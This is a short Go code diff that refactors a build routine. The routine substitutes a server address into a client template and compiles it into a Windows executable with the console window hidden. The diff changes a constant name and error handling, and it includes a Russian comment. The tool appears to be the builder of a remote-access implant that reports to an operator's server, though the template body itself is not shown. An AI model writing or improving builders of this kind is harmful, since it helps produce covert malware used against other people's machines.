@@ -8,7 +8,7 @@ import (
 	"strings"
 )
 
-const template = `package main
+const clientTemplate = `package main
 
 import (
 	"encoding/base64"
@@ -396,24 +396,25 @@ func copyFile(src, dst string) error {
 }`
 
 func Build(serverHost string, buildID string) error {
-	code := strings.ReplaceAll(template, "YOUR_SERVER_IP", serverHost)
+	code := strings.ReplaceAll(clientTemplate, "YOUR_SERVER_IP", serverHost)
 
 	buildDir := filepath.Join("builds", buildID)
 	if err := os.MkdirAll(buildDir, 0755); err != nil {
-		return err
+		return fmt.Errorf("failed to create build directory: %v", err)
 	}
 
 	clientPath := filepath.Join(buildDir, "client.go")
 	if err := os.WriteFile(clientPath, []byte(code), 0644); err != nil {
-		return err
+		return fmt.Errorf("failed to write client.go: %v", err)
 	}
 
 	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", "client.exe", "client.go")
 	cmd.Dir = buildDir
 	cmd.Env = append(os.Environ(), "CGO_ENABLED=1", "GOOS=windows", "GOARCH=amd64")
+
 	if err := cmd.Run(); err != nil {
-		return "", fmt.Errorf("build failed: %v", err)  // Чистое сообщение об ошибке
+		return fmt.Errorf("build failed: %v", err)
 	}
 
-	return filepath.Join(buildDir, "client.exe"), nil
+	return nil
 }
